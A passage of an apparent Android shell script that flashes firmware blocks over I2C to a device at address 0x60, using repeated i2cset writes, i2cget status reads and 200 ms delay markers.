/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x92 0x93 0x94 0x95 0x96 0x97 0xd8 0xd9 0xda 0xdb 0xdf 0x0 0xcf 0x2d i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x3c 0x1 0x3 0x7 0xf i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x1f 0x3f 0x7f 0xff 0x70 0xbf 0x62 0xd0 0x0 0x5d 0xd5 0x8 0x5d 0xd0 0x8 0x62 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0xd5 0x0 0x55 0xfa 0x2 0x4f 0x5b 0x1 0x3 0x53 0xf9 0x55 0xf8 0x3a 0x50 0x6 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x0 0x51 0xfe 0x53 0x3d 0x18 0x60 0xd0 0x18 0x60 0xd5 0x47 0x3d 0x80 0xa0 0xa i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x50 0x0 0x26 0x3d 0x7f 0x12 0x3d 0x53 0x3d 0x6 0x3d 0xbe 0x59 0x42 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x3d 0x62 0xd3 0x0 0x57 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x0 0x56 0x7e 0x0 0x79 0xdf 0xfb 0x62 0xd3 0x0 0x57 0x0 0x50 0x5 0x54 0x7f i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x79 0xdf 0xfc 0x62 0xd3 0x0 0x50 0xff 0x57 0x0 0x54 0x80 0x79 0xdf 0xfc 0x70 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x3f 0x71 0xc0 0x55 0x12 0xb4 0x55 0x13 0xff 0x55 0x14 0x28 0x55 0x15 0x14 0x55 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x16 0x5 0x55 0x17 0xff 0x43 0x79 0x2 0x55 0x36 0x3 0x55 0xab 0xe7 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x3e 0x33 0x14 0x43 0x7a i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x1 0x90 0xc3 0x43 0xdf 0x1 0x50 0x1 0x57 0xc 0x90 0x76 0x90 0xab 0x57 0xd i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x50 0x99 0x91 0xb6 0x70 0xbf 0x57 0x0 0x62 0xd3 0x0 0x52 0x38 0x53 0x26 0x55 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x25 0x0 0x5f 0x2c 0x3d 0x55 0x2b 0x0 0x7c 0xe 0xcd 0x5f 0x26 0x2c 0x5f 0x25 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x2b 0x55 0x20 0x9a 0x55 0x1f 0x1 0x7c 0xe 0x67 0x51 0x26 0x27 0xe0 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x3f 0x62 0xd3 0x0 0x54 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x97 0x79 0xdf 0xd5 0x70 0x3f 0x71 0xc0 0x41 0x79 0xfd 0x62 0xa0 0x28 0x62 0xa2 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x84 0x50 0x0 0x90 0x15 0x50 0x1 0x57 0xc 0x90 0x27 0x57 0xd 0x50 0x99 0x91 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x69 0x50 0x2 0x57 0x10 0x90 0x1b 0x90 0x50 0x7f 0x62 0xd0 0x0 0x39 0x9 0xc0 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x3 0x50 0x8 0x53 0x36 0xfe 0xf6 0x29 0x20 0x60 0xa9 0x51 0xaf 0xf1 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x40 0x35 0x58 0x34 0x90 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x1 0x7f 0x62 0xd0 0x0 0x21 0x3 0x53 0x35 0x64 0x64 0x64 0x64 0x64 0x29 0x80 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x60 0xa1 0x5b 0x78 0x21 0xf 0x29 0x8 0x74 0x53 0x34 0x12 0x36 0x2 0x35 0x5c i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x50 0x0 0x53 0x31 0x53 0x37 0x29 0x1 0x79 0xa0 0x8 0x64 0x6b 0x31 0x6b 0x37 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x8f 0xf5 0x60 0xb5 0x51 0x31 0x60 0xb4 0x7f 0x50 0x1 0x78 0x19 0xc6 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x41 0x8 0x90 0x2d 0x90 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x5f 0x18 0x78 0xdf 0xf8 0x7f 0x62 0xd0 0x0 0x62 0xa3 0x50 0x51 0x36 0xfe 0x9d i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x29 0x20 0x60 0xa9 0x43 0x61 0xd 0x57 0x0 0x50 0x2 0x90 0x18 0x43 0xa3 0x70 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x62 0xa2 0x84 0x62 0xa0 0x8 0x43 0xdf 0x1 0x7f 0x1 0x1 0x64 0x5c 0xff 0xfa i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x4b 0x74 0xff 0xf6 0x7f 0x62 0xd0 0x0 0x53 0x31 0x10 0x5b 0x30 0xf5 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x42 0x64 0x64 0x5c 0x71 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x10 0x5e 0x1 0x2a 0x31 0x61 0x1 0x36 0x31 0xff 0x5e 0x0 0x22 0x31 0x61 0x0 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x36 0x31 0xff 0x18 0xfe 0x60 0x5c 0x5e 0x0 0x2a 0x31 0x61 0x0 0x70 0xef 0x7f i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x62 0xd0 0x0 0x10 0x73 0x53 0x31 0x71 0x10 0x5b 0xfe 0x4a 0x5c 0x5e 0x0 0x22 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x31 0x61 0x0 0x70 0xef 0x18 0x64 0x64 0x5c 0x71 0x10 0x5e 0xae 0xf2 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x43 0x1 0x22 0x31 0x61 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x1 0x36 0x31 0xff 0x5e 0x0 0x2a 0x31 0x61 0x0 0x70 0xef 0x7f 0x70 0xbf 0x62 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0xd0 0x0 0x53 0x32 0x50 0x0 0x53 0x2e 0x53 0x2f 0x51 0x32 0x5c 0x62 0xd3 0x0 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x52 0x38 0x53 0x33 0x41 0xa9 0xef 0x43 0xa9 0x10 0x43 0xa0 0x1 0x51 0x33 0x60 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0xfd 0x41 0xa3 0xdf 0x51 0x32 0x9f 0x74 0x9f 0x7b 0x58 0x37 0xd 0xb1 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x44 0x55 0x30 0x0 0x62 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0xa5 0x0 0x62 0xa4 0x0 0x43 0xb3 0x1 0x51 0x30 0xaf 0xfd 0x79 0xdf 0xee 0x51 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x32 0x9f 0x59 0x9f 0x8b 0x43 0xa3 0x20 0x41 0xa0 0xfe 0x62 0xfd 0x0 0x50 0xff i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x4c 0x2f 0x14 0x2f 0x51 0x34 0x11 0x8 0xfd 0xd1 0x4c 0x2e 0x1c 0x2e 0xd0 0x7 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x55 0x2e 0x0 0x55 0x2f 0x0 0x51 0x32 0x64 0x5c 0x62 0xd3 0x78 0x88 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x45 0x0 0x51 0x2f 0x54 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x8e 0x51 0x2e 0x54 0x8d 0x70 0x3f 0x71 0xc0 0x7f 0x70 0xbf 0x62 0xd0 0x0 0x53 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x3a 0x5a 0x39 0x55 0x32 0x0 0x62 0xd3 0x0 0x58 0x32 0x56 0x38 0x80 0x55 0x3c i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x8 0x55 0x3b 0x80 0x51 0x32 0x9f 0x65 0x51 0x32 0x9f 0x61 0x70 0xbf 0x58 0x32 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x62 0xd3 0x0 0x51 0x2f 0x3a 0x3a 0x51 0x2e 0x1a 0x39 0xd0 0x2d 0xf3 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x46 0x6 0x51 0x3b 0x73 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x25 0x38 0x68 0x3b 0x26 0x3b 0x7f 0x51 0x3b 0x2d 0x38 0x7a 0x3c 0xbf 0xd6 0x7a i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x32 0xdf 0xc4 0x70 0x3f 0x71 0xc0 0x7f 0x70 0xbf 0x62 0xd3 0x0 0x5c 0x52 0x97 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x70 0x3f 0x71 0xc0 0x7f 0x62 0xe3 0x38 0x70 0xfe 0x70 0xef 0x62 0xde 0x0 0x62 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0xdf 0x0 0x62 0xe0 0x0 0x62 0xdc 0x0 0x62 0xdb 0x0 0x62 0xc1 0x1c i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x47 0xda 0x0 0x70 0x0 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x71 0x82 0x62 0xd0 0x0 0x62 0xd3 0x0 0x62 0xd4 0x0 0x62 0xd5 0x0 0x62 0xd1 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x0 0x50 0x8 0x78 0x60 0xd3 0x57 0x0 0x75 0x56 0x0 0x0 0xbf 0xfb 0x39 0x0 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x62 0xe3 0x38 0xbf 0xef 0x70 0x2 0x70 0xef 0x43 0x4 0xa0 0x71 0x10 0x43 0x5 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0xa0 0x43 0x4 0xa0 0x70 0xef 0x41 0xd6 0xbf 0x71 0x10 0x62 0xa7 0xe9 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x48 0xe3 0x7 0x70 0xef i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x50 0x80 0x4e 0x5d 0xd5 0x8 0x62 0xd5 0x0 0x55 0xfa 0x1 0x40 0x4f 0x5b 0x1 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x3 0x53 0xf9 0x55 0xf8 0x3a 0x50 0x6 0x0 0x40 0x40 0x71 0x10 0x51 0xf9 0x60 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0xe8 0x70 0xef 0x18 0x60 0xd5 0x55 0xf8 0x0 0x55 0xf9 0x0 0x71 0x10 0x62 0xe0 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x1a 0x70 0xef 0x62 0xe3 0x38 0x71 0x10 0x41 0xe1 0xfe 0x70 0xe3 0x62 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x49 0xef 0x62 0xe3 0x38 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x62 0xd1 0x3 0x50 0x0 0x4e 0x62 0xd3 0x3 0x62 0xd0 0x0 0x62 0xd4 0x0 0x71 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0xc0 0x7c 0xb 0x7 0x62 0xd0 0x0 0x50 0xa 0x57 0xb0 0x8 0x28 0x53 0x73 0x18 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x75 0x9 0x0 0x28 0x4b 0x51 0x73 0x80 0x4 0x75 0x9 0x0 0x62 0xe3 0x0 0x8 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x28 0x60 0xd5 0x74 0xa0 0x4b 0x18 0x75 0x9 0x0 0x8 0x28 0xc6 0x29 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x4a 0x53 0x73 0x18 0x75 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x9 0x0 0x8 0x28 0xa0 0x1c 0x53 0x72 0x18 0x75 0x9 0x0 0x8 0x28 0x3f 0x73 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x47 0x73 0xff 0xb0 0x6 0x5d 0xd5 0x74 0x60 0xd5 0x18 0x7a 0x72 0xbf 0xeb 0x8f i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0xc9 0x18 0x75 0x9 0x0 0x8 0x28 0x53 0x72 0x50 0x0 0x3f 0x73 0x47 0x73 0xff i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0xb0 0x8 0x5d 0xd5 0x74 0x60 0xd5 0x50 0x0 0x7a 0x72 0xbf 0xa9 0xf0 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x4b 0xef 0x18 0x8f 0xaa i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x18 0x71 0x10 0x43 0xe3 0x0 0x70 0xef 0x62 0xe0 0x0 0x41 0xfe 0xe7 0x43 0xfe i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x0 0x71 0x10 0x62 0xe0 0x19 0x70 0xef 0x62 0xe2 0x0 0x7c 0x19 0x7e 0x8f 0xff i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x10 0x4f 0x38 0x9 0x56 0x0 0x0 0x56 0x1 0x0 0x56 0x2 0x0 0x56 0x3 0x0 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x62 0xd0 0x0 0x7c 0x1d 0x97 0x6 0x72 0x85 0x7c 0x1d 0x56 0x73 0x85 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x4c 0x54 0x3 0x51 0x73 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x54 0x2 0x56 0x1 0x0 0x56 0x0 0x0 0x7c 0x1d 0x97 0x6 0x72 0x81 0x7c 0x1d i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x56 0x7c 0x1d 0xf9 0x52 0xfc 0x53 0x72 0x55 0x73 0x0 0x6 0x72 0x9e 0xe 0x73 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x0 0x51 0x73 0x60 0xd4 0x3e 0x72 0x54 0x8 0x56 0x7 0x0 0x3d 0x7 0x0 0xb0 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x6 0x3d 0x8 0x0 0xa0 0x2b 0x3d 0x7 0x0 0xb0 0x6 0x3d 0xdc 0x58 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x4d 0x8 0x1 0xa0 0x64 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x3d 0x7 0x0 0xb0 0x6 0x3d 0x8 0x2 0xa0 0xb8 0x3d 0x7 0x0 0xb0 0x6 0x3d i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x8 0x3 0xa1 0xfa 0x3d 0x7 0x0 0xb0 0x6 0x3d 0x8 0x4 0xa2 0x60 0x83 0x8f i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x62 0xd0 0x0 0x7c 0x1d 0x97 0x6 0x72 0x85 0xe 0x73 0x0 0x51 0x73 0x60 0xd5 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x52 0xfa 0x3f 0x72 0x52 0xfb 0x3f 0x72 0x7c 0x1d 0x97 0x7c 0x5a 0x55 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x4e 0x1e 0x9f 0x52 0xfa i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x3f 0x72 0x52 0xfb 0x3f 0x72 0x52 0xfc 0x53 0x72 0x55 0x73 0x0 0x6 0x72 0x9e i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0xe 0x73 0x0 0x51 0x73 0x60 0xd5 0x50 0x1 0x3f 0x72 0x55 0x90 0x19 0x55 0x8f i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x0 0x83 0x52 0x52 0x0 0x8 0x52 0x1 0x8 0x52 0x2 0x8 0x52 0x3 0x8 0x50 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x0 0x8 0x8 0x8 0x50 0x3f 0x8 0x62 0xd0 0x0 0x7c 0x1c 0x13 0xc8 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x4f 0xa4 0x38 0xfc 0x18 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x54 0x3 0x18 0x54 0x2 0x18 0x54 0x1 0x18 0x7c 0x1c 0xf0 0x7c 0x1d 0x97 0x6 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x72 0x81 0x7c 0x1d 0x56 0x7c 0x1d 0xf9 0x51 0x9d 0x7c 0x1e 0x7a 0xd0 0x18 0x52 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0xfc 0x53 0x72 0x55 0x73 0x0 0x6 0x72 0x9e 0xe 0x73 0x0 0x51 0x73 0x60 0xd5 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x50 0x2 0x3f 0x72 0x80 0x7 0x7c 0x1d 0xb9 0x7c 0x1e 0x3b 0x72 0x87 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x50 0x7c 0x1d 0xc4 0x82 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0xf4 0x62 0xd0 0x0 0x7c 0x1d 0x97 0x6 0x72 0x81 0x7c 0x1d 0x56 0x7c 0x1d 0xf9 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x51 0x9d 0x7c 0x1e 0x7a 0xd1 0x2c 0x52 0x0 0x8 0x52 0x1 0x8 0x52 0x2 0x8 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x52 0x3 0x8 0x50 0x0 0x8 0x8 0x8 0x50 0x30 0x8 0x7c 0x1c 0xa4 0x38 0xfc i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x18 0x54 0x3 0x18 0x54 0x2 0x18 0x54 0x1 0x18 0x54 0x0 0x32 0x8 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x51 0x7c 0x1d 0x97 0x6 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x72 0x8d 0x7c 0x1d 0x56 0x53 0x70 0x51 0x73 0x53 0x71 0x55 0x72 0x0 0x55 0x73 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x0 0x50 0x4 0x62 0xd0 0x0 0x65 0x70 0x6b 0x71 0x6b 0x72 0x6b 0x73 0x78 0xbf i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0xf3 0x51 0x70 0x5 0x3 0x51 0x71 0xd 0x2 0x51 0x72 0xd 0x1 0x51 0x73 0xd i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x0 0x7c 0x1d 0x64 0x7c 0x1d 0x97 0x6 0x72 0x81 0x7c 0x1d 0x15 0xcf i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x52 0x56 0x53 0x72 0x52 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x3 0x53 0x70 0x52 0x2 0x53 0x71 0x51 0x70 0x12 0x72 0x53 0x72 0x51 0x71 0x1a i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x73 0x53 0x73 0x51 0x72 0x54 0x5 0x51 0x73 0x54 0x4 0x52 0xfc 0x53 0x72 0x55 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x73 0x0 0x6 0x72 0x7d 0xe 0x73 0x0 0x51 0x73 0x60 0xd4 0x3e 0x72 0x53 0x72 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x40 0x55 0x73 0x0 0x6 0x72 0x14 0xe 0x73 0x0 0x52 0x5 0x12 0x9e 0xe2 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 i
@200
/data/local/tmp/i2cget -f -y 1 0x60 0x0
/data/local/tmp/i2cget -f -y 1 0x60 0x1
/data/local/tmp/i2cget -f -y 1 0x60 0x2
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x0 0xff 0x39 0x0 0x1 0x2 0x3 0x4 0x5 0x6 0x7 0x0 0x53 0x72 0x51 0x73 0x31 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x10 0x80 0x53 0x68 0x52 0x4 0x31 0x80 0x1a 0x68 0xd0 0x18 0x52 0xfc 0x53 0x72 0x55 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x20 0x73 0x0 0x6 0x72 0x9e 0xe 0x73 0x0 0x51 0x73 0x60 0xd5 0x50 0x2 0x3f 0x72 i
/data/local/tmp/i2cset -f -y 1 0x60 0x0 0x30 0x80 0x67 0x7c 0x1d 0xb9 0x6 0x72 0x9e 0xe 0x73 0x0 0x51 0x73 0x60 0xd5 0x50 i
